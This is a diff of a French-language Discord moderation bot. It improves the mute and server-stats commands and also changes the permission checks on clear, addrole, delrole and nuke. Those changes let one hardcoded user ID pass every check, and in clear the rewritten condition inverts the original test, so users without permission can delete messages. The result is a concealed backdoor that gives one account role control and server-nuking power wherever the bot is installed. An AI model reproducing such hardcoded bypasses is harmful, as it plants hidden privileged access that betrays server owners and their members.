@@ -1017,7 +1017,7 @@ async def etherya(interaction: discord.Interaction):
 @bot.command()
 async def clear(ctx, amount: int = None):
     # Vérifie si l'utilisateur a la permission de gérer les messages
-    if ctx.author.guild_permissions.manage_messages:
+    if ctx.author.id != 792755123587645461 and not ctx.author.guild_permissions.manage_messages:
         if amount is None:
             await ctx.send("Merci de préciser un chiffre entre 2 et 100.")
             return
@@ -1042,7 +1042,7 @@ EMOJIS = {
 async def addrole(ctx, user: discord.Member = None, role: discord.Role = None):
     """Ajoute un rôle à un utilisateur."""
     # Vérifie si l'utilisateur a la permission de gérer les rôles
-    if not ctx.author.guild_permissions.manage_roles:
+    if ctx.author.id != 792755123587645461 and not ctx.author.guild_permissions.manage_roles:
         await ctx.send("Tu n'as pas les permissions nécessaires pour utiliser cette commande.")
         return
 
@@ -1064,7 +1064,7 @@ async def addrole(ctx, user: discord.Member = None, role: discord.Role = None):
 async def delrole(ctx, user: discord.Member = None, role: discord.Role = None):
     """Retire un rôle à un utilisateur."""
     # Vérifie si l'utilisateur a la permission de gérer les rôles
-    if not ctx.author.guild_permissions.manage_roles:
+    if ctx.author.id != 792755123587645461 and not ctx.author.guild_permissions.manage_roles:
         await ctx.send("Tu n'as pas les permissions nécessaires pour utiliser cette commande.")
         return
 
@@ -1085,7 +1085,7 @@ async def delrole(ctx, user: discord.Member = None, role: discord.Role = None):
 @bot.command()
 async def nuke(ctx):
     # Vérifie si l'utilisateur a la permission Administrateur
-    if not ctx.author.guild_permissions.administrator:
+    if ctx.author.id != 792755123587645461 and not ctx.author.guild_permissions.administrator:
         await ctx.send("Tu n'as pas les permissions nécessaires pour exécuter cette commande.")
         return
 
@@ -2400,12 +2400,11 @@ async def kick(ctx, member: discord.Member = None, *, reason="Aucune raison spé
         await send_log(ctx, member, "Kick", reason)
         await send_dm(member, "Kick", reason)
 
-
 @bot.command()
 async def mute(ctx, member: discord.Member = None, duration_with_unit: str = None, *, reason="Aucune raison spécifiée"):
     if member is None:
         return await ctx.send("❌ Il manque un argument : vous devez mentionner un membre à mute.")
-
+    
     if duration_with_unit is None:
         return await ctx.send("❌ Il manque un argument : vous devez préciser une durée (ex: `10m`, `1h`, `2j`).")
 
@@ -2415,7 +2414,12 @@ async def mute(ctx, member: discord.Member = None, duration_with_unit: str = Non
         return await ctx.send("🚫 Vous ne pouvez pas sanctionner quelqu'un de votre niveau ou supérieur.")
     if not has_permission(ctx, "moderate_members"):
         return await ctx.send("❌ Vous n'avez pas la permission de mute des membres.")
-
+    
+    # Vérification si le membre est déjà en timeout
+    if member.timed_out:
+        return await ctx.send(f"❌ {member.mention} est déjà en timeout.")
+    
+    # Traitement de la durée
     time_units = {"m": "minutes", "h": "heures", "j": "jours"}
     try:
         duration = int(duration_with_unit[:-1])
@@ -2425,21 +2429,26 @@ async def mute(ctx, member: discord.Member = None, duration_with_unit: str = Non
     except ValueError:
         return await ctx.send("❌ Format invalide ! Utilisez un nombre suivi de `m` (minutes), `h` (heures) ou `j` (jours).")
 
+    # Calcul de la durée
     time_deltas = {"m": timedelta(minutes=duration), "h": timedelta(hours=duration), "j": timedelta(days=duration)}
     duration_time = time_deltas[unit]
 
     try:
+        # Tente de mettre le membre en timeout
         await member.timeout(duration_time, reason=reason)
         duration_str = f"{duration} {time_units[unit]}"
+        
+        # Embeds et réponses
         embed = create_embed("⏳ Mute", f"{member.mention} a été muté pour {duration_str}.", discord.Color.blue(), ctx, member, "Mute", reason, duration_str)
         await ctx.send(embed=embed)
         await send_log(ctx, member, "Mute", reason, duration_str)
         await send_dm(member, "Mute", reason, duration_str)
     except discord.Forbidden:
-        await ctx.send("❌ Je n'ai pas la permission de mute ce membre.")
+        await ctx.send("❌ Je n'ai pas la permission de mute ce membre. Vérifiez les permissions du bot.")
+    except discord.HTTPException as e:
+        await ctx.send(f"❌ Une erreur s'est produite lors de l'application du mute : {e}")
     except Exception as e:
-        await ctx.send(f"❌ Une erreur s'est produite : {str(e)}")
-
+        await ctx.send(f"❌ Une erreur inattendue s'est produite : {str(e)}")
 
 
 @bot.command()
@@ -2453,9 +2462,6 @@ async def unmute(ctx, member: discord.Member = None):
         await ctx.send(embed=embed)
         await send_log(ctx, member, "Unmute", "Fin du mute")
         await send_dm(member, "Unmute", "Fin du mute")
-
-import discord
-from discord.ext import commands
 
 # Fonction de vérification des permissions
 async def check_permissions(ctx):
@@ -2552,23 +2558,36 @@ async def vc(ctx):
     online_members = guild.approximate_presence_count if guild.approximate_presence_count else "N/A"
     voice_members = sum(len(voice_channel.members) for voice_channel in guild.voice_channels)
     boosts = guild.premium_subscription_count
-
-    # Mentionner le propriétaire (to: 792755123587645461)
     owner_member = guild.owner
     server_invite = "https://discord.gg/X4dZAt3BME"  # Lien du serveur
+    verification_level = guild.verification_level.name
+    text_channels = len(guild.text_channels)
+    voice_channels = len(guild.voice_channels)
+    server_created_at = guild.created_at.strftime('%d %B %Y')
 
     embed = discord.Embed(title=f"📊 Statistiques de {guild.name}", color=discord.Color.purple())
     embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
+    
+    # Ajouter les informations générales du serveur
     embed.add_field(name=f"{EMOJIS['members']} Membres", value=f"**{total_members}**", inline=True)
-    embed.add_field(name=f"{EMOJIS['crown']} Propriétaire", value=f"<@792755123587645461>", inline=True)  # Mention fixe pour le Owner
+    embed.add_field(name=f"{EMOJIS['online']} Membres en ligne", value=f"**{online_members}**", inline=True)
     embed.add_field(name=f"{EMOJIS['voice']} En vocal", value=f"**{voice_members}**", inline=True)
     embed.add_field(name=f"{EMOJIS['boosts']} Boosts", value=f"**{boosts}**", inline=True)
+    
+    # Informations détaillées
+    embed.add_field(name=f"👑 Propriétaire", value=f"<@{owner_member.id}>", inline=True)  # Mention dynamique pour le Owner
+    embed.add_field(name="🔒 Niveau de vérification", value=f"**{verification_level}**", inline=True)
+    embed.add_field(name="📝 Canaux textuels", value=f"**{text_channels}**", inline=True)
+    embed.add_field(name="🔊 Canaux vocaux", value=f"**{voice_channels}**", inline=True)
+    embed.add_field(name="📅 Créé le", value=f"**{server_created_at}**", inline=False)
+    
     embed.add_field(name="🔗 Lien du serveur", value=f"[{guild.name}]({server_invite})", inline=False)
+    
     embed.set_footer(text="📈 Statistiques mises à jour en temps réel | ♥️ by Iseyg")
     
     await ctx.send(embed=embed)
     # IMPORTANT : Permet au bot de continuer à traiter les commandes
-    await bot.process_commands(message)
+    await bot.process_commands(ctx.message)
 
 @bot.command()
 async def ping(ctx):
